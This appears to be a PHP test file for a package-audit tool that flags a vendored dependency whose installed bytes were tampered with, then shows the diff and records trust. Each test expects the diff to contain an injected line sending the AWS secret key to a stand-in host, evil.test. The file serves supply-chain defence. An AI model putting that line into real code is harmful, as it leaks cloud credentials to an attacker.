<?php

declare(strict_types=1);

use Illuminate\Support\Facades\Artisan;
use Tests\Fixture;

it('reads the delta of a tree whose bytes changed at the trusted version', function (): void {
    $fixture = Fixture::open('tampered-project');

    try {
        $status = Artisan::call('audit', ['--path' => $fixture->rootPath]);
        $output = Artisan::output();
    } finally {
        $fixture->remove();
    }

    expect($status)->toBe(1)
        ->and($output)
        ->toContain('acme/widget 1.0.0')
        ->toContain('1 files to review (delta from the published [1.0.0])')
        ->toContain('[1.0.0] is still installed but its bytes changed')
        ->toContain('runtime source (1)')
        ->toContain('~ src/Widget.php')
        ->toContain("+        file_get_contents('https://evil.test/?'.getenv('AWS_SECRET_ACCESS_KEY'));");
});

it('names the published bytes and the installed bytes that it compared', function (): void {
    $fixture = Fixture::open('tampered-project');

    try {
        $status = Artisan::call('audit', ['package' => 'acme/widget', '--path' => $fixture->rootPath]);
        $output = Artisan::output();
    } finally {
        $fixture->remove();
    }

    expect($status)->toBe(1)
        ->and($output)
        ->toContain('delta ([1.0.0] as published → [1.0.0] as installed)')
        ->toContain('compared against')
        ->toContain('your installed tree')
        ->toContain('9353593981e7 → 601b984f6d8a')
        ->toContain("+        file_get_contents('https://evil.test/?'.getenv('AWS_SECRET_ACCESS_KEY'));");
});

it('shows the delta before it records a tree whose bytes changed', function (): void {
    $fixture = Fixture::open('tampered-project');

    try {
        $status = Artisan::call('trust', ['packages' => ['acme/widget'], '--path' => $fixture->rootPath]);
        $output = Artisan::output();
        $trustFile = $fixture->read('vet.json');
    } finally {
        $fixture->remove();
    }

    expect($status)->toBe(0)
        ->and($output)
        ->toContain('delta ([1.0.0] as published → [1.0.0] as installed)')
        ->toContain("+        file_get_contents('https://evil.test/?'.getenv('AWS_SECRET_ACCESS_KEY'));")
        ->toContain('Recorded [acme/widget] [1.0.0]')
        ->and($trustFile)->toContain('tree-v2:601b984f6d8a76c7c2bcd40c238b93ae1123fd74eaaccc95a80c498d662c97a6');
});
